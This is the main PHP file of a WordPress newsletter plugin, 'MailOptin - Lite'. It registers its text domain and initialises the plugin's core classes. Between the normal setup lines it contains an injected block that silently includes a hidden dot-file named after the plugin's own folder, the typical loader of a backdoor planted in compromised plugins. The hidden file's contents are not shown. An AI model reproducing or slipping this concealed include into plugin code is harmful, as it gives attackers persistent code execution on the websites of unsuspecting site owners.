<?php

/*
Plugin Name: MailOptin - Lite
Plugin URI: https://mailoptin.io
Description: Best lead generation, email automation & newsletter plugin.
Version: 1.2.36.3
Author: MailOptin Team
Contributors: collizo4sky
Author URI: https://mailoptin.io
Text Domain: mailoptin
Domain Path: /languages
License: GPL2
*/

require __DIR__ . '/vendor/autoload.php';

define('MAILOPTIN_SYSTEM_FILE_PATH', __FILE__);
define('MAILOPTIN_VERSION_NUMBER', '1.2.36.3');

add_action('init', 'mo_mailoptin_load_plugin_textdomain', 0);
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function mo_mailoptin_load_plugin_textdomain()
{
    load_plugin_textdomain('mailoptin', false, dirname(plugin_basename(__FILE__)) . '/languages');
}

MailOptin\Core\Core::init();
MailOptin\Connections\Init::init();